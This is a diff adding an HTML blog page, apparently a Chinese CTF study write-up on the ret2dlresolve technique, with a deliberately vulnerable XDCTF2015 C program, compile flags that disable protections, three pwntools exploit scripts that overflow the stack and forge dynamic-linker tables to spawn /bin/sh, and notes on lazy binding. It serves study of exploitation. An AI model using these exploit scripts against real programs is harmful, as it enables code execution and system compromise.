@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"xiaoxiaoxy1.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js"></script>
+<meta name="description" content="ctfwiki-高级ROP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2dlresolve">
+<meta property="og:url" content="http://xiaoxiaoxy1.github.io/2022/08/25/ret2dlresolve/index.html">
+<meta property="og:site_name" content="xiaoxiaoxy">
+<meta property="og:description" content="ctfwiki-高级ROP">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/08/25/ret2dlresolve/1.jpeg">
+<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/08/25/ret2dlresolve/2.jpeg">
+<meta property="article:published_time" content="2022-08-25T14:57:54.000Z">
+<meta property="article:modified_time" content="2022-08-25T16:12:47.160Z">
+<meta property="article:author" content="xiaoxiaoxy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://xiaoxiaoxy1.github.io/2022/08/25/ret2dlresolve/1.jpeg">
+
+
+<link rel="canonical" href="http://xiaoxiaoxy1.github.io/2022/08/25/ret2dlresolve/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://xiaoxiaoxy1.github.io/2022/08/25/ret2dlresolve/","path":"2022/08/25/ret2dlresolve/","title":"ret2dlresolve"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ret2dlresolve | xiaoxiaoxy</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="xiaoxiaoxy" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">xiaoxiaoxy</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#32%E4%BD%8D"><span class="nav-number">1.</span> <span class="nav-text">32位</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NO-RELRO"><span class="nav-number">1.1.</span> <span class="nav-text">NO RELRO</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E9%A2%98%E7%9B%AEC%E4%BB%A3%E7%A0%81"><span class="nav-number">1.1.1.</span> <span class="nav-text">1、题目C代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E8%A7%A3%E9%A2%98exp"><span class="nav-number">1.1.2.</span> <span class="nav-text">2、解题exp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="nav-number">1.1.3.</span> <span class="nav-text">3、知识点：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Partial-RELRO"><span class="nav-number">1.2.</span> <span class="nav-text">Partial RELRO</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="xiaoxiaoxy"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">xiaoxiaoxy</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://xiaoxiaoxy1.github.io/2022/08/25/ret2dlresolve/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="xiaoxiaoxy">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xiaoxiaoxy">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ret2dlresolve
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-08-25 22:57:54" itemprop="dateCreated datePublished" datetime="2022-08-25T22:57:54+08:00">2022-08-25</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2022-08-26 00:12:47" itemprop="dateModified" datetime="2022-08-26T00:12:47+08:00">2022-08-26</time>
+      </span>
+
+  
+</div>
+
+            <div class="post-description">ctfwiki-高级ROP</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><h3 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO RELRO"></a>NO RELRO</h3><p>解题场景：ubuntu18.04（注：ubuntu20.04 gcc版本过高，存在一些保护机制）</p>
+<h4 id="1、题目C代码"><a href="#1、题目C代码" class="headerlink" title="1、题目C代码"></a>1、题目C代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    write(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译指令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -m32 -z norelro -no-pie main.c -o main_norelro_32</span><br></pre></td></tr></table></figure>
+
+<h4 id="2、解题exp"><a href="#2、解题exp" class="headerlink" title="2、解题exp"></a>2、解题exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考exp1 #--------------------------长串payload做法----------------------------#</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.arch=<span class="string">&quot;i386&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line">rop = ROP(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">rop.raw(offset*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x08049804</span>+<span class="number">4</span>,<span class="number">4</span>) <span class="comment"># modify .dynstr pointer in .dynamic section to a specific location</span></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">&quot;read&quot;</span>,<span class="string">&quot;system&quot;</span>)</span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x080498E0</span>,<span class="built_in">len</span>((dynstr))) <span class="comment"># construct a fake dynstr section</span></span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x080498E0</span>+<span class="number">0x100</span>,<span class="built_in">len</span>(<span class="string">&quot;/bin/sh\x00&quot;</span>)) <span class="comment"># read /bin/sh\x00</span></span><br><span class="line">rop.raw(<span class="number">0x08048376</span>) <span class="comment"># the second instruction of read@plt </span></span><br><span class="line">rop.raw(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop.raw(<span class="number">0x080498E0</span>+<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># print(rop.dump())</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line">rop.raw(<span class="string">&quot;a&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">p.send(rop.chain())</span><br><span class="line">p.send(p32(<span class="number">0x080498E0</span>))</span><br><span class="line">p.send(dynstr)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参考exp2 #--------------------------栈迁移做法---------------------------------#</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">elf = ELF (<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote (＇127.0.0.1＇,10001)</span></span><br><span class="line">io = process (<span class="string">&#x27;./ydm&#x27;</span>)</span><br><span class="line">pppr_addr = <span class="number">0x08048619</span>      <span class="comment"># pop esi ; pop edi ; pop ebp ; ret </span></span><br><span class="line">pop_ebp_addr =<span class="number">0x0804861b</span>    <span class="comment"># pop ebp ; ret</span></span><br><span class="line">leave_ret_addr =<span class="number">0x08048458</span>  <span class="comment"># leave ; ret</span></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt [<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got [<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt  = elf.plt [<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">plt_0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr </span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr </span><br><span class="line">dynsym  = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr </span><br><span class="line">dynstr  = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr  </span><br><span class="line">bss_addr = elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr + <span class="number">0x500</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stack_pivot</span> ():</span></span><br><span class="line">    payload_1  = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x6c</span> + <span class="number">4</span>)</span><br><span class="line">    payload_1 += p32(read_plt)        <span class="comment"># read (0, bss _ addr ,100)</span></span><br><span class="line">    payload_1 += p32(pppr_addr)       <span class="comment"># clean the stack </span></span><br><span class="line">    payload_1 += p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">100</span>) </span><br><span class="line">    payload_1 += p32(pop_ebp_addr)</span><br><span class="line">    payload_1 += p32(bss_addr)        <span class="comment"># ebp </span></span><br><span class="line">    payload_1 += p32(leave_ret_addr)  <span class="comment"># mov esp , ebp ; pop ebp ; pop eip </span></span><br><span class="line">    io.send(payload_1)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span> ():</span></span><br><span class="line">    reloc_index = bss_addr + <span class="number">28</span> - rel_plt </span><br><span class="line">    r_sym  = (bss_addr + <span class="number">40</span> - dynsym )/<span class="number">0x10</span></span><br><span class="line">    r_type = <span class="number">0x7</span></span><br><span class="line">    r_info = (r_sym &lt;&lt; <span class="number">8</span>) + (r_type &amp; <span class="number">0xff</span>) </span><br><span class="line">    fake_reloc = p32(write_got) + p32( r_info)</span><br><span class="line">    st_name = bss_addr + <span class="number">56</span> - dynstr </span><br><span class="line">    st_bind = <span class="number">0x1</span></span><br><span class="line">    st_type = <span class="number">0x2</span></span><br><span class="line">    st_info = (st_bind &lt;&lt; <span class="number">4</span>) + (st_type &amp; <span class="number">0xf</span>)</span><br><span class="line">    fake_sym   = p32(st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(st_info) </span><br><span class="line">    payload_7  = <span class="string">b&#x27;AAAA&#x27;</span></span><br><span class="line">    payload_7 += p32(plt_0)</span><br><span class="line">    payload_7 += p32(reloc_index ) </span><br><span class="line">    payload_7 += <span class="string">b&#x27;AAAA&#x27;</span></span><br><span class="line">    payload_7 += p32(bss_addr +<span class="number">80</span>) </span><br><span class="line">    payload_7 += <span class="string">b&#x27;AAAAAAAA&#x27;</span></span><br><span class="line">    payload_7 += fake_reloc </span><br><span class="line">    payload_7 += <span class="string">b&#x27;AAAA&#x27;</span>  </span><br><span class="line">    payload_7 += fake_sym</span><br><span class="line">    payload_7 += <span class="string">&quot;system\x00&quot;</span></span><br><span class="line">    payload_7 += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">80</span>- <span class="built_in">len</span> ( payload_7)) </span><br><span class="line">    payload_7 += <span class="string">&quot;/bin/sh\x00&quot;</span>  </span><br><span class="line">    payload_7 += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">100</span>-<span class="built_in">len</span>(payload_7))</span><br><span class="line">    io.sendline(payload_7)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    stack_pivot ()</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 个人exp1 #--------------------------长串payload做法----------------------------#</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ydm1804&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ydm1804&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># copy dynstr表并将read字符串改为system字符串</span></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">&quot;read&quot;</span>,<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">ppp_addr = <span class="number">0x08048629</span>   <span class="comment"># pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 长串payload，注意栈上数据排布</span></span><br><span class="line">payload  = <span class="number">112</span>*<span class="string">&quot;a&quot;</span></span><br><span class="line">payload += p32(<span class="number">0x08048370</span>)   <span class="comment"># read@plt 修改dynstr表的地址为bss段起始地址,达到劫持dynstr表的目的</span></span><br><span class="line">payload += p32(<span class="number">0x08048629</span>) + p32(<span class="number">0x0</span>) + p32(<span class="number">0x08049804</span>+<span class="number">4</span>) + p32(<span class="number">0x4</span>) </span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0x08048370</span>)   <span class="comment"># read@plt 将dynstr表中的read替换为system,并写入bss段</span></span><br><span class="line">payload += p32(<span class="number">0x08048629</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x080498E0</span>) + p32(<span class="built_in">len</span>(dynstr))</span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0x08048370</span>)   <span class="comment"># read@plt 将system()的参数/bin/sh写入bss段</span></span><br><span class="line">payload += p32(<span class="number">0x08048629</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x080498E0</span> + <span class="number">0x100</span>) + p32(<span class="built_in">len</span>(<span class="string">&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0x08048376</span>)   <span class="comment"># read@plt 2 触发动态链接,调用我们重构的dynstr表,调用system()</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x080498E0</span> + <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(p32(<span class="number">0x080498E0</span>))</span><br><span class="line">io.send(dynstr)</span><br><span class="line">io.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="3、知识点："><a href="#3、知识点：" class="headerlink" title="3、知识点："></a>3、知识点：</h4><p>动态链接的过程要了解</p>
+<p>（1）第一次调用libc中的函数时，整个过程大致以下几步</p>
+<p><img src="1.jpeg" alt="img"></p>
+<p><strong>参考链接：</strong><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/184099">ret2dl_resolve解析 - 安全客，安全资讯平台</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#程序先从第一个参数link_map获取字符串表.dynstr、符号表.dynsym以及重定位表.rel.plt的地址，</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过第二个参数n即.rel.plt表中的偏移reloc_arg加上.rel.plt的地址获取函数对应的重定位结构的位置，从而获取函数对应的r_offset以及在符号表中的下标r_info&gt;&gt;8。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#根据符号表地址以及下标获取符号结构体，获得了函数符号表中的st_name，即函数名相对于字符串表.dynstr的偏移。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#最后可得到函数名的字符串，然后去libc中匹配函数名，找到相应的函数并将地址填回到r_offset即函数got表中，延迟绑定完成。</span></span><br></pre></td></tr></table></figure>
+
+<p>plt第二行压入偏移值 reloc_arg</p>
+<p>got + 4 存入link_map地址</p>
+<p>got + 8 存储 _dl_runtime_resolve 函数的地址</p>
+<p>调用 _dl_runtime_resolve 函数的过程中会执行 _dl_fixup 函数，该函数会将偏移值与link_map作为参数，并且执行该函数时会获取 dynstr表地址、dynsym表地址、rel.plt表地址……<strong>(ctf竞赛权威指南P214)</strong></p>
+<p>之后在libc中查找函数是通过dynstr表中的字符串比对来查找函数的</p>
+<p>（2）第二次及第二次以后：</p>
+<p><img src="2.jpeg" alt="img"></p>
+<h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/08/11/%E6%B1%87%E7%BC%96%E8%A7%92%E5%BA%A6%E7%90%86%E8%A7%A3C%E4%BB%A3%E7%A0%81/" rel="prev" title="理解C代码">
+                  <i class="fa fa-chevron-left"></i> 理解C代码
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xiaoxiaoxy</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
